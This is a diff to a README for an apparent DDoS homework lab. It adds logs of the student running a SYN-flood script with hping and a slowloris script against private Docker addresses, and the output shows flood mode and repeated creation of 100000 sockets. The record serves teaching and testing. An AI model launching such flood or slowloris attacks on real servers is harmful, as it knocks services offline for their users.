@@ -31,3 +31,41 @@ HPING 172.26.0.2 (eth0 172.26.0.2): S set, 40 headers + 0 data bytes
 hping in flood mode, no replies will be shown
 
 ![изображение](https://github.com/user-attachments/assets/aff704d2-beb1-4aeb-afe6-22e0a087df42)
+
+## slowloris
+
+PS E:\ai\ai_anppr\HSA13_hw16_ddos_attacks> docker exec -it kali sh
+# PS E:\ai\ai_anppr\HSA13_hw16_ddos_attacks> docker exec -it kali sh
+# chmod +x /workspace/scripts/syn_flood.sh
+# /workspace/scripts/syn_flood.sh
+HPING 172.26.0.2 (eth0 172.26.0.2): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+sh: 1: PS: not found
+# # # sh: 4: Syntax error: "(" unexpected
+# sh: 4: hping: not found
+# exit
+PS E:\ai\ai_anppr\HSA13_hw16_ddos_attacks> docker exec -it kali sh
+# chmod +x /workspace/scripts/slowloris.sh
+# /workspace/scripts/slowloris.sh
+[02-03-2025 15:38:06] Attacking 172.18.0.3 with 100000 sockets.
+[02-03-2025 15:38:06] Creating sockets...
+[02-03-2025 15:38:10] Sending keep-alive headers...
+[02-03-2025 15:38:10] Socket count: 0
+[02-03-2025 15:38:10] Creating 100000 new sockets...
+[02-03-2025 15:38:29] Sending keep-alive headers...
+[02-03-2025 15:38:29] Socket count: 0
+[02-03-2025 15:38:29] Creating 100000 new sockets...
+[02-03-2025 15:38:48] Sending keep-alive headers...
+[02-03-2025 15:38:48] Socket count: 0
+[02-03-2025 15:38:48] Creating 100000 new sockets...
+[02-03-2025 15:39:07] Sending keep-alive headers...
+[02-03-2025 15:39:07] Socket count: 0
+[02-03-2025 15:39:07] Creating 100000 new sockets...
+[02-03-2025 15:39:26] Sending keep-alive headers...
+[02-03-2025 15:39:26] Socket count: 0
+[02-03-2025 15:39:26] Creating 100000 new sockets...
+[02-03-2025 15:39:45] Sending keep-alive headers...
+
+
+![изображение](https://github.com/user-attachments/assets/79a25c25-8d3b-4c7e-8d41-f5af3913fb4a)
+
